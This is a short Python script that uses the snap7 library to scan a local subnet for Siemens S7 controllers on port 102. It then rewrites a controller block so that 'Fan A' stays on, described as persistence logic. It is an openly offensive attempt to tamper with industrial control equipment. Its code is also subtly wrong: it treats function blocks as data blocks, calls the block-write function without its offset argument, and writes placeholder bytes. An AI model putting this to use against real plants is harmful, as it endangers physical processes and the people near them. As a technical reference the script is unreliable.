import snap7
from snap7.util import *
from snap7.types import *
import socket

# Function to discover the PLC's IP address
def discover_plc_ip():
    # Replace with the expected PLC subnet or use network scanning tools
    subnet = "192.168.0."
    for i in range(1, 255):
        ip = subnet + str(i)
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.1)
                s.connect((ip, 102))  # Port 102 is used by S7 protocol
                return ip
        except:
            continue
    return None

# Function to modify the PLC program
def modify_plc_program(plc_ip):
    # Connect to the PLC
    plc = snap7.client.Client()
    plc.connect(plc_ip, 0, 1)

    # Read the existing program blocks (e.g., FC1 and FC2)
    fc1_data = plc.db_get(1)  # Assuming FC1 is stored in DB1
    fc2_data = plc.db_get(2)  # Assuming FC2 is stored in DB2

    # Append or modify logic for persistence
    # Example: Add a new network to FC1 to ensure Fan A is always activated
    new_logic = b"\x00\x00\x00\x00"  # Example bytecode for new logic (replace with actual logic)
    fc1_data = fc1_data + new_logic

    # Write the modified program back to the PLC
    plc.db_write(1, fc1_data)
    print("Modified FC1 block written to the PLC.")

    # Disconnect from the PLC
    plc.disconnect()

# Main script execution
if __name__ == "__main__":
    # Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if plc_ip:
        print(f"Discovered PLC IP address: {plc_ip}")
        # Modify the PLC program
        modify_plc_program(plc_ip)
    else:
        print("Could not discover the PLC's IP address.")